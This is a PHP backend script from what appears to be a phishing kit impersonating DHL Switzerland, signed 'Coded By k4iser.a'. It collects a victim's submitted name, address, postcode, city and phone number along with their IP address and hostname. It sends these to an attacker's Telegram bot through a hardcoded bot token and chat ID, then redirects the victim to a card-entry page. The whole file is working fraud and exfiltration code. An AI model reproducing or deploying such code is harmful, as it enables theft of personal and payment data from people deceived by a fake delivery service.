<?php


$FName=$_POST["FName"];
$LName=$_POST["LName"];
$address=$_POST["address"];
$zip=$_POST["zip"];
$city=$_POST["city"];
$phone=$_POST["phone"];


$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['FName'] = $FName;
        $_SESSION['LName'] = $LName;
        $_SESSION['address'] = $address;
        $_SESSION['zip'] = $zip;
        $_SESSION['city'] = $city;
        $_SESSION['phone'] = $phone;



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|BILLING DHL-CH |----------|\n";
$message .= "Full Name  : ".$_SESSION['FName'].$_SESSION['LName']."\n";
$message .= "Address    : ".$_SESSION['address']."\n";
$message .= "ZIP    : ".$_SESSION['zip']."\n";
$message .= "CITY    : ".$_SESSION['city']."\n";
$message .= "PHONE    : ".$_SESSION['phone']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";
$subject = "~ <Rslt-DHL-CH>- Coded By k4iser.a ~ | $ip";


$token = "6971582979:AAHB7TR8g8yOihvuVlXsOlTJfvepzv3JBD0";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=6413015802&text=" . urlencode($message)."" );
header("location:load.php?vc?__event=card&service_id=top_card=AU")
?>